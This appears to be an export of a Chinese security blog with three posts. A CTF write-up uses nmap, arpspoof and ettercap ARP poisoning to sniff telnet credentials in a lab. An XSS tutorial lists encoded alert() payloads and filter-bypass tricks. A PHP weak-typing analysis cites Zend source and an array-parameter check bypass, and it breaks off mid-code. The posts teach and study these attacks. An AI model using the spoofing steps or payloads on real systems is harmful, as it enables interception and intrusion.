gigem&#123;w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE&#125; Calculator12345678910Using a teletype network protocol from the 70s to access a calculator from the 70s? Far out!Note to new players: You won&apos;t see anything in Wireshark / tcpdump when you initially connect. (i.e. packets are sent unicast on a bridged network)WiresharktcpdumpettercapDifficulty: easy2/23 8:56 am: Added suggested tools nmap扫描 123456789101112131415Nmap scan report for 172.30.0.2Host is up (0.33s latency).Not shown: 999 closed portsPORT STATE SERVICE23/tcp open telnetMAC Address: 02:42:4E:8E:83:1A (Unknown)Nmap scan report for 172.30.0.3Host is up (0.34s latency).All 1000 scanned ports on 172.30.0.3 are closedMAC Address: 02:42:3B:45:EB:29 (Unknown)Nmap scan report for 172.30.0.14Host is up (0.0000020s latency).All 1000 scanned ports on 172.30.0.14 are closed 1arpspoof -i tap0 -t 172.30.0.2 172.30.0.3 直接使用arpspoof进行arp欺骗，再使用wireshark进行抓包尝试读取telnet的密码进行登入，但是并未获得想要的数据。 Telnet非常容易遭受到mitm攻击，所以这次我们尝试使用ettercap进行arp欺骗与mitm攻击，在kali上进行以下操作 1234567891011121.ettercap -G2.Sniff----Unified-sniffing，然后选择网卡tap03.Hosts---Scan for hosts---Hosts list，此时可以看到目标主机ip4.将172.30.0.2点add to target 1,将目标主机添加到目标1;选定路由，将172.30.0.2点add to target 2,将路由添加到目标25.然后点mitm --- arp posoning ，勾选sniff remote connections：6.之后start --- start sniffing开始监听点view -- connections开始查看连接：可以获得172.30.0.2的Telnet信息7.telnet 172.30.0.2 238.ls -a9.cat .ctf_flag 成功读取到flag Alt-F4 for Ops依旧是首先nmap一下。 1nmap -Pn 172.30.0.0/28 12345678910111213141516...Nmap scan report for 172.30.0.2...23/tcp open telnetMAC Address: 02:42:4E:8E:83:1A (Unknown)Nmap scan report for 172.30.0.3...All 1000 scanned ports on 172.30.0.3 are closedMAC Address: 02:42:A5:33:79:0D (Unknown)Nmap scan report for 172.30.0.14...All 1000 scanned ports on 172.30.0.14 are closedNmap done: 16 IP addresses (3 hosts up) scanned in 146.64 seconds 尝试使用ettercap进行arp欺骗与mitm攻击。 12345671.ettercap -G2.Sniff----Unified-sniffing，然后选择网卡tap03.Hosts---Scan for hosts---Hosts list，此时可以看到目标主机ip4.将172.30.0.2点add to target 1,将目标主机添加到目标1;选定路由，将172.30.0.2点add to target 2,将路由添加到目标25.然后点mitm --- arp posoning ，勾选sniff remote connections：6.之后start --- start sniffing开始监听点view -- connections开始查看连接： ………… 资料 https://blog.csdn.net/rectsuly/article/details/63261412]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[探索xss中的编码原理]]></title>
    <url>%2F2019%2F03%2F06%2F%E6%8E%A2%E7%B4%A2xss%E4%B8%AD%E7%9A%84%E7%BC%96%E7%A0%81%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[JS解码 先给出结论 在javascript伪协议形式，全部字符串可以是任意的URL编码和实体字符。 在IE解析HTML时，只对所有实体编码做出解码，在解析URL时，会解码URL编码，script标签时，原始文本均不做处理！ 我们再给出下面三个testTest1：URL 编码 “javascript:alert(1)”URL编码“javascript:alert(1)”=“%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29” Test2：HTML字符实体编码 “javascript” 、URL 编码 “alert(2)”HTML编码”javascript”=”&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;” URL编码”alert(2)”=” %61%6C%65%72%74%28%32%29” Test3：对&lt;a href=&quot;javascript:alert(3)&quot;&gt;test3&lt;/a&gt;做JS编码àURL编码àHTML编码共3层。 JS编码： 1&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(3)&quot;&gt;test3&lt;/a&gt; URL编码： 1&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(3)&quot;&gt;test3&lt;/a&gt; HTML编码： 1&lt;a href=&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#49;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#54;&amp;#51;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#54;&amp;#37;&amp;#51;&amp;#53;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#50;&amp;#37;&amp;#53;&amp;#99;&amp;#37;&amp;#55;&amp;#53;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#48;&amp;#37;&amp;#51;&amp;#55;&amp;#37;&amp;#51;&amp;#52;&amp;#40;&amp;#51;&amp;#41;&quot;&gt;test3&lt;/a&gt; 【过程分析】许多童鞋把Test1放到HTML里发现脚本并没有正常执行，就会想按照刚才分析的，URL解码之后Javascript解析器完成解码操作，脚本应该会正常执行啊，这里就有一个URL解析过程中的一个细节了，不能对协议类型进行任何的编码操作，否则URL解析器会认为它无类型，就导致Test1中被编码的“javascript”没有解码，当然不会被URL解析器识别了。 这时候我们对于为什么question3、Question 1不能xss有了足够理解了把？ 那Test2也是对javascript编码了为什么可以执行呢？因为”javascript”是做的HTML实体编码，HTML解析器工作时，href里的HTML实体会被解码，接下来URL解析器工作解析href属性里的链接时，”javascript”协议在第一步被HTML解码了，这样URL解析器是可以识别的，然后继续解析后面的”%61%6C%65%72%74%28%32%29”，最后JavaScript解析器完成解析操作，脚本执行。 这时候我们对于为什么question2能xss有了足够理解了把？ Test3实现了3层复合编码，每一层编码都能正常执行，并思考一下在复合编码环境中XSS防御策略不做组合编码，后果是什么呢？ 我们接下来再提出几个问题Question 4 12&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; &lt;img src=x onerror=alert(4)&gt; Question 5 1&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; 1&lt;script&gt;alert(5)&lt;/script&gt; Question 6 1&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; 答案：都不可以执行xss，并且Question 5 实体编码不会被解码探索：为什么呢？回到我们之前所说的，浏览器，以IE为例子，拿到HTML文本代码，然后扫描寻找左尖括号&lt;，找到即开始按照后面的字符串来生成相应的对象，然后把之后属性的值“赋值”给对象相应的属性，这里说明一下，这个属性其实在内存里并不是一个直接的值，而还是一个对象。假设之前的例子中在a标签中的href里，有一个&gt;符号，所以现浏览器只认&lt;,Question 4中这里根本没有在文本里扫描到&lt;（因为被实体编码了），故根本就不是对象，不产生IMG元素 那么问题又来了，假如说Question 5中也同样用这种方式是可以解释的通，那么为什么Question 6却无法xss弹窗呢？ 这里的textarea是一个非常特殊的例子 它有一个如下的特性即使将html代码段插入textarea， html代码段不会执行， 仅仅将其作为普通文本显示。在Question 5、6中只扫描到了textarea类型，产生了textarea，其余字符串只是作为值字符串，值里含有&lt;字符。 当然textarea并非是绝对安全的，它仍然会遭到xss的攻击在插入textarea内容时候，提前关闭标签，然后输出script脚本，如下 即构成如下脚本 123456&lt;textarea&gt;&lt;/textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; 我们接下来继续再提出几个问题Question 7 1&lt;button onclick=&quot;confirm(&apos;7&amp;#39;);&quot;&gt;Button&lt;/button&gt; Question 8 1&lt;button onclick=&quot;confirm(&apos;8\u0027);&quot;&gt;Button&lt;/button&gt; 答案：Question 8不可以执行xss，Question 7可以执行xss探索：为什么呢？因为onclick是事件触发情形，而事件触发的情况下只解码实体编码所以对于Question 7来说进行HTML解码后就原始文本所以是可以被执行的，但是对于Question 8就不行了是不是对这两个问题有了一定了解了呢？ 我们接下来继续提出一系列问题Question 9 1&lt;script&gt;alert(9);&lt;/script&gt; Question 10 1&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt; Question 11 1&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029\u003b&lt;/script&gt; Question 12 1&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032);&lt;/script&gt; Question 13 1&lt;script&gt;alert(&apos;13\u0027)&lt;/script&gt; Question 14 1&lt;script&gt;alert(&apos;14\u000a&apos;)&lt;/script&gt; Question 15 1&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt; 答案：只有9、10、14可以进行xss探索：我们在之前提到：对于script标签定义的JS,可以泛理解为IE会直接产生script对象，之后把innerHTML，也就是JS代码内容直接原封不动传给JS引擎去解释执行。 当然Question 9 在script标签里，原封不动交给js引擎。当然是可以触发xss的。这里涉及到JS引擎对字符串的解码 先说question 14javascript 出发了JS 解释器，JS会先对内容进行解析，里边有一个转义字符\u000a,前导的 \u 表示他是一个Unicode 字符，根据后边的数字，解析为’14 ’，于是在完成JS的解析之后变成了： 12&lt;script&gt;alert(&apos;14&apos;)&lt;/script&gt; 然后JS 解释器执行alert(‘14‘)，这句话会交给浏览器渲染，最终弹窗。这里边会有一个看起来让人有些疑惑的东西，以question 10为例子，假如我们编码的位置不是括号里，而是在alert上，我们知道，js 是会对它进行逆转义的：所以question 10 仍然是可以的而另一方面，如果想用这种方式来替换掉圆括号，或者引号，会判定为失败。同时，主要注意的方式，上边这种直接在字符串外进行专一的方式，只有Unicode 转义方式呗支持，其他转义方式则不行。其实，这样的策略是正确的，因为对于JavaScript，转义编码应当只出现在标示符部分，不能用于对语法有真正影响的符号，也就是括号，或者是引号 所以question 11、12、13 是不可以进行xss的至于Question 15 这里采用了html编码而这里却是需要先进行js解码，所以Question 15毫无疑问也是不可以的 当然这些问题同样也是适用于javascript伪协议的，如下，当然我就不再进行解释了，原理也是一样的 1&lt;a href=&quot;javascript:alert(&apos;&lt;一&gt;&apos;)&quot;&gt;test&lt;/a&gt; 12 &lt;a href=&quot;javascript:alert(&apos;&lt;\u4e00&gt;&apos;)&quot;&gt;test&lt;/a&gt; 12 &lt;a href=&quot;javascript:\u0061lert(&apos;&lt;一&gt;&apos;)&quot;&gt;test&lt;/a&gt; 在一个页面中，可以出发JS 解析器的方式有这么几种 直接嵌入&lt; script&gt; 代码块。通过&lt; script sr=… &gt; 加载代码。各种HTML CSS 参数支持JavaScript：URL 触发调用。CSS expression(…) 语法和某些浏览器的XBL 绑定。事件处理器(Event handlers),比如 onload, onerror, onclick等等。定时器，Timer(setTimeout, setInterval)eval(…) 调用 最后我们再次构造两个场景 场景一：&lt;script&gt;alert(‘xss’)&lt;/script&gt;： 1234567891011&lt;html&gt;&lt;script&gt;function init()&#123;document.getElementById(&quot;div1&quot;).innerHTML=&quot;&lt;script&gt;alert(&apos;aa&apos;)&lt;/script&gt;&quot;;&#125;&lt;/script&gt;&lt;body onload=init()&gt;&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 场景二：&lt;img src=’non-exist.jpg’ onerror=”alert(‘xss’)”&gt; 1234567891011&lt;html&gt;&lt;script&gt;function init()&#123;document.getElementById(&quot;div1&quot;).innerHTML=&quot;&lt;img src=&apos;aa.jpg&apos; onerror=\&quot;alert(&apos;aa&apos;)\&quot;/&gt;&quot;;&#125;&lt;/script&gt;&lt;body onload=init()&gt;&lt;div id=&quot;div1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 如果把这2个分别保存成HTML，但是发现第一个&lt;script&gt;alert(‘xss’)&lt;/script&gt;不会执行，但是第二个例子是会执行的。想想看为什么？Tips： innerHTML只能使用&lt;img src=1onerror=alert(1)&gt;这种方式来触发JS。而不能以&lt;script&gt;alert(1)&lt;/script&gt;来触发，因为这种压根不会执行&lt;script&gt;..&lt;/script&gt;之间的内容。因为当我们的HTML解析器解析到&lt;script&gt;标签时，它会快速去查找离它最近的闭合标签&lt;/script&gt;。而当我们提交&lt;script&gt;alert(1);&lt;/script&gt;,则可以正常弹框。 还是同样的解析原则，html解析引擎解析到&lt;script&gt;时，它会快速去查找离它最近的闭合标签&lt;/script&gt;。这是在到第8行时发现&lt;\/script&gt;标签，而不是&lt;/script&gt;,故继续往下，直到找寻到&lt;/script&gt;标签，才完成了配对。其中的代码交给了js引起去解析。由于&lt;script&gt;alert(1);&lt;/script&gt;双引号包围，所以js解析器会把它当字符串处理。 所以最终的解析结果是第8行中的&lt;script&gt;和&lt;/script&gt;都是字符串而不是标签。 值得注意的是第当\字符的引入使得&lt;script&gt;标签在html解析引擎解析时未在最近被闭合,同时又因为\为js语法中的转义字符，故在js解析引擎解析时，又能正常解析input_str变量的值为&lt;script&gt;alert(1);&lt;/script&gt;字符串，所以最总成功弹窗，很巧妙！ 小结：我们知道XSS漏洞最常见的检测方式就是输入&lt;script&gt;alert(‘xss’)&lt;/script&gt;来确认，大部分人在测试的时候就是直接使用类似&lt;script&gt;alert(‘xss’)&lt;/script&gt;这样的输入，如果发现有弹出对话框就说明存在漏洞，如果没有对话框就认为不存在漏洞。那么，只使用&lt;script&gt;标签是否就足够了呢？ 后记对于xss编码的研究就先到这里了，当然xss的绕过方法不仅仅只有编码这一种，但仅仅只是编码问题，想要研究透彻还是需要一些时间的，这里我仅仅是探索一些我能够查到的资料，还有未查到的知识等着我们探索 参考 https://blog.csdn.net/qq_35513598/article/details/79861908https://blog.csdn.net/czh500/article/details/79903698http://test.attacker-domain.com/browserparsing/tests.htmlhttps://xz.aliyun.com/t/1556https://shinpachi8.github.io/2017/07/28/xss%E7%BC%96%E7%A0%81/https://security.yirendai.com/news/share/26https://www.cnblogs.com/lightsong/p/4356698.htmlhttp://www.voidcn.com/article/p-tapgsgbo-baz.htmlhttp://gv7.me/articles/2018/escape-string-in-xss/http://xuelinf.github.io/2016/05/18/%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88/]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次深入理解PHP弱类型原理的经历并以此第一次深入了解PHP内核]]></title>
    <url>%2F2019%2F03%2F04%2F%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8E%9F%E7%90%86%E7%9A%84%E7%BB%8F%E5%8E%86%E5%B9%B6%E4%BB%A5%E6%AD%A4%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3PHP%E5%86%85%E6%A0%B8%2F</url>
    <content type="text"><![CDATA[前言在CTF比赛中PHP弱类型的特性常常被用上，但我们往往知其然不知其所以然，究竟为什么PHP是弱类型呢？很少人深究。在这次源码分析的过程中我收获很大，第一次学会了如何深入理解一个问题，虽然花费了我很多时间，但这可以说是一段非常值得的经历。 正文首先引入一个问题，为什么以下结果是恒为真的呢？ 123var_dump([]&gt;1);var_dump([]&gt;0);var_dump([]&gt;-1); 当然实际ctf中问题可能会如下 1$_GET[Password]&gt;99999; 当传入Password[]=1时侯恒为真当然再换一种形式 1var_dump([[]]&gt;[1]); 依旧是恒为真对于这类问题，很多人都是认为PHP因为它是弱类型语言它就有这种特性那么为什么PHP会有这种特性呢？我们首先查阅下PHP手册Comparison Operators在手册中写到，当array和anything进行比较的时候array is always greater这是一种PHP的定义。那么究竟PHP到底在哪定义了这种特点呢？我们依旧不知道。我们再抛出个问题究竟什么是PHP弱类型呢？很多人可能会回答弱类型就是弱类型，当传入Password[]=1就会绕过这就是弱类型这种回答肯定是不妥当的具体弱类型定义 PHP是弱类型语言，不需要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不同表达式所需要的类型自动转换，比如求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另外一种类型都有固定的规则，当某个操作发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。 我们再通过查阅PHP源码来深刻理解PHP弱类型的特点PHP是开源的一种语言，我们在Github上可以很容易的查询到它的源码传送门这里找函数会方便点当然解释下什么是Zend Zend是PHP语言实现的最为重要的部分，是PHP最基础、最核心的部分，它的源码在/Zend目录下，PHP代码从编译到执行都是由Zend完成的 至于为什么要查询zend_operators.h这个文件，operator操作符，其他几个文件不像存在比较函数，有的时候查源码时候就是需要靠感觉，这种大项目 函数变量什么的都有规范 一般所见即所得 看懂英语就大概猜得到用途的，当然这个文件也不一般我再进行解释下,当然想深入理解可以看这里 PHP在内核中是通过zval这个结构体来存储变量的，它的定义在Zend/zend.h文件里，简短精炼，只有四个成员组成： 我们定位到函数 ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2); 这里传入了两个值op1,op2,传出一个result解释下zval类型 zval以一个P结尾的宏的参数大多是zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是*zval。 这样说可能会有些抽象我们换种方式解释，当再php源码中要想判断一个变量的类型最直接的方式，比如想判断这个变量是否为空变量-&gt;type == IS_NULL 这种方法虽然是正确的，但PHP官网并不建议这么做，PHP中定义了大量的宏，供我们检测、操作变量使用解释下什么是宏 C语言中允许用一个标识符来标识一个字符串，称为“宏”；标识符为“宏名”。在编译预处理时，对程序中所有出现的“宏名”，都用宏定义时的字符串去代换，简称“宏代换”或“宏展开”。一般形式：#define 宏名 字符串 宏定义说明及注意： 宏定义时用宏名来表示一个字符串，在宏展开时又以该字符串替换了宏名，这只是一个简单的替换；宏定义不需要再行末加分号，若加上分号，则会连分号也会被替换的；宏定义必须在函数外面；宏定义的作用域：从定义命令至程序结束，若想终止宏的作用域，则使用undef命令；宏名在程序中用引号括起来，则预处理程序对其不进行宏替换；宏定义是可以嵌套使用的，在展开时，由预处理程序层层替换；建议在进行宏定义时，尽量使用大写字母表示宏名；可用宏来表示数据类型，使书写方便；对“输出格式”做用定义，可以减少书写麻烦。 PHP建议使用的形式Z_TYPE_P(变量) == IS_NULL 以一个P结尾的宏的参数大多是zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是*zval 这样我们便可以猜测一下php内核是如何实现gettype这个函数了，代码如下：想要详细了解的可以看这里 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//开始定义php语言中的函数gettypePHP_FUNCTION(gettype)&#123; //arg间接指向调用gettype函数时所传递的参数。是一个zval**结构 //所以我们要对他使用__PP后缀的宏。 zval **arg; //这个if的操作主要是让arg指向参数～ if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;Z&quot;, &amp;arg) == FAILURE) &#123; return; &#125; //调用Z_TYPE_PP宏来获取arg指向zval的类型。 //然后是一个switch结构，RETVAL_STRING宏代表这gettype函数返回的字符串类型的值 switch (Z_TYPE_PP(arg)) &#123; case IS_NULL: RETVAL_STRING(&quot;NULL&quot;, 1); break; case IS_BOOL: RETVAL_STRING(&quot;boolean&quot;, 1); break; case IS_LONG: RETVAL_STRING(&quot;integer&quot;, 1); break; case IS_DOUBLE: RETVAL_STRING(&quot;double&quot;, 1); break; case IS_STRING: RETVAL_STRING(&quot;string&quot;, 1); break; case IS_ARRAY: RETVAL_STRING(&quot;array&quot;, 1); break; case IS_OBJECT: RETVAL_STRING(&quot;object&quot;, 1); break; case IS_RESOURCE: &#123; char *type_name; type_name = zend_rsrc_list_get_rsrc_type(Z_LVAL_PP(arg) TSRMLS_CC); if (type_name) &#123; RETVAL_STRING(&quot;resource&quot;, 1); break; &#125; &#125; default: RETVAL_STRING(&quot;unknown type&quot;, 1); &#125;&#125; 以上三个宏的定义在Zend/zend_operators.h里，定义分别是： #define Z_TYPE(zval) (zval).type #define Z_TYPE_P(zval_p) Z_TYPE(*zval_p) #define Z_TYPE_PP(zval_pp) Z_TYPE(**zval_pp) 这也是为是什么在Zend/zend_operators.h里面进行查询的原因，貌似有些跑题了？ 当然下一个问题，为什么我们要定位到函数is_smaller_function这里主要是靠对于PHP源码的熟悉，进行猜测，当然有的时候分析源码的时候可以讲PHP源码下载下载，部分IDE会有提供函数来源的功能其实本来有个 lxr.php.net 可以让我们迅速定位到我们想要的函数，但是这个网站在16年后就不是很稳定了，甚至有人将它当做一个BUG提交给PHP官网，这是一个很有趣的事情，具体可以了解这里那么我们还有没有什么办法迅速定位到我们需要的函数呢？ 进入is_smaller_function的函数 12345678ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */&#123; if (compare_function(result, op1, op2) == FAILURE) &#123; return FAILURE; &#125; ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0)); return SUCCESS;&#125; 这里有一个compare_function函数以及ZVAL_BOOL我们先分析下compare_function函数跟进 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193ZEND_API int ZEND_FASTCALL compare_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */&#123; int ret; int converted = 0; zval op1_copy, op2_copy; zval *op_free, tmp_free; while (1) &#123; switch (TYPE_PAIR(Z_TYPE_P(op1), Z_TYPE_P(op2))) &#123; case TYPE_PAIR(IS_LONG, IS_LONG): ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0)); return SUCCESS; case TYPE_PAIR(IS_DOUBLE, IS_LONG): Z_DVAL_P(result) = Z_DVAL_P(op1) - (double)Z_LVAL_P(op2); ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result))); return SUCCESS; case TYPE_PAIR(IS_LONG, IS_DOUBLE): Z_DVAL_P(result) = (double)Z_LVAL_P(op1) - Z_DVAL_P(op2); ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result))); return SUCCESS; case TYPE_PAIR(IS_DOUBLE, IS_DOUBLE): if (Z_DVAL_P(op1) == Z_DVAL_P(op2)) &#123; ZVAL_LONG(result, 0); &#125; else &#123; Z_DVAL_P(result) = Z_DVAL_P(op1) - Z_DVAL_P(op2); ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result))); &#125; return SUCCESS; case TYPE_PAIR(IS_ARRAY, IS_ARRAY): ZVAL_LONG(result, zend_compare_arrays(op1, op2)); return SUCCESS; case TYPE_PAIR(IS_NULL, IS_NULL): case TYPE_PAIR(IS_NULL, IS_FALSE): case TYPE_PAIR(IS_FALSE, IS_NULL): case TYPE_PAIR(IS_FALSE, IS_FALSE): case TYPE_PAIR(IS_TRUE, IS_TRUE): ZVAL_LONG(result, 0); return SUCCESS; case TYPE_PAIR(IS_NULL, IS_TRUE): ZVAL_LONG(result, -1); return SUCCESS; case TYPE_PAIR(IS_TRUE, IS_NULL): ZVAL_LONG(result, 1); return SUCCESS; case TYPE_PAIR(IS_STRING, IS_STRING): if (Z_STR_P(op1) == Z_STR_P(op2)) &#123; ZVAL_LONG(result, 0); return SUCCESS; &#125; ZVAL_LONG(result, zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2))); return SUCCESS; case TYPE_PAIR(IS_NULL, IS_STRING): ZVAL_LONG(result, Z_STRLEN_P(op2) == 0 ? 0 : -1); return SUCCESS; case TYPE_PAIR(IS_STRING, IS_NULL): ZVAL_LONG(result, Z_STRLEN_P(op1) == 0 ? 0 : 1); return SUCCESS; case TYPE_PAIR(IS_OBJECT, IS_NULL): ZVAL_LONG(result, 1); return SUCCESS; case TYPE_PAIR(IS_NULL, IS_OBJECT): ZVAL_LONG(result, -1); return SUCCESS; default: if (Z_ISREF_P(op1)) &#123; op1 = Z_REFVAL_P(op1); continue; &#125; else if (Z_ISREF_P(op2)) &#123; op2 = Z_REFVAL_P(op2); continue; &#125; if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op1, compare)) &#123; ret = Z_OBJ_HANDLER_P(op1, compare)(result, op1, op2); if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123; convert_compare_result_to_long(result); &#125; return ret; &#125; else if (Z_TYPE_P(op2) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op2, compare)) &#123; ret = Z_OBJ_HANDLER_P(op2, compare)(result, op1, op2); if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123; convert_compare_result_to_long(result); &#125; return ret; &#125; if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_TYPE_P(op2) == IS_OBJECT) &#123; if (Z_OBJ_P(op1) == Z_OBJ_P(op2)) &#123; /* object handles are identical, apparently this is the same object */ ZVAL_LONG(result, 0); return SUCCESS; &#125; if (Z_OBJ_HANDLER_P(op1, compare_objects) == Z_OBJ_HANDLER_P(op2, compare_objects)) &#123; ZVAL_LONG(result, Z_OBJ_HANDLER_P(op1, compare_objects)(op1, op2)); return SUCCESS; &#125; &#125; if (Z_TYPE_P(op1) == IS_OBJECT) &#123; if (Z_OBJ_HT_P(op1)-&gt;get) &#123; zval rv; op_free = Z_OBJ_HT_P(op1)-&gt;get(Z_OBJ_P(op1), &amp;rv); ret = compare_function(result, op_free, op2); zend_free_obj_get_result(op_free); return ret; &#125; else if (Z_TYPE_P(op2) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op1)-&gt;cast_object) &#123; ZVAL_UNDEF(&amp;tmp_free); if (Z_OBJ_HT_P(op1)-&gt;cast_object(Z_OBJ_P(op1), &amp;tmp_free, ((Z_TYPE_P(op2) == IS_FALSE || Z_TYPE_P(op2) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op2))) == FAILURE) &#123; ZVAL_LONG(result, 1); zend_free_obj_get_result(&amp;tmp_free); return SUCCESS; &#125; ret = compare_function(result, &amp;tmp_free, op2); zend_free_obj_get_result(&amp;tmp_free); return ret; &#125; &#125; if (Z_TYPE_P(op2) == IS_OBJECT) &#123; if (Z_OBJ_HT_P(op2)-&gt;get) &#123; zval rv; op_free = Z_OBJ_HT_P(op2)-&gt;get(Z_OBJ_P(op2), &amp;rv); ret = compare_function(result, op1, op_free); zend_free_obj_get_result(op_free); return ret; &#125; else if (Z_TYPE_P(op1) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op2)-&gt;cast_object) &#123; ZVAL_UNDEF(&amp;tmp_free); if (Z_OBJ_HT_P(op2)-&gt;cast_object(Z_OBJ_P(op2), &amp;tmp_free, ((Z_TYPE_P(op1) == IS_FALSE || Z_TYPE_P(op1) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op1))) == FAILURE) &#123; ZVAL_LONG(result, -1); zend_free_obj_get_result(&amp;tmp_free); return SUCCESS; &#125; ret = compare_function(result, op1, &amp;tmp_free); zend_free_obj_get_result(&amp;tmp_free); return ret; &#125; else if (Z_TYPE_P(op1) == IS_OBJECT) &#123; ZVAL_LONG(result, 1); return SUCCESS; &#125; &#125; if (!converted) &#123; if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0); return SUCCESS; &#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1); return SUCCESS; &#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0); return SUCCESS; &#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123; ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1); return SUCCESS; &#125; else &#123; op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1); op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1); if (EG(exception)) &#123; if (result != op1) &#123; ZVAL_UNDEF(result); &#125; return FAILURE; &#125; converted = 1; &#125; &#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123; ZVAL_LONG(result, 1); return SUCCESS; &#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123; ZVAL_LONG(result, -1); return SUCCESS; &#125; else &#123; ZEND_ASSERT(0); zend_throw_error(NULL, &quot;Unsupported operand types&quot;); if (result != op1) &#123; ZVAL_UNDEF(result); &#125; return FAILURE; &#125; &#125; &#125;&#125;/* &#125;&#125;&#125; */ 有点长，想要仔细了解的可以详细看讲解下首先这个先等下说这里进行swich 判断op1 与 op2 的类型这里我们先拿第一句进行分析 123case TYPE_PAIR(IS_LONG, IS_LONG): ZVAL_LONG(result, 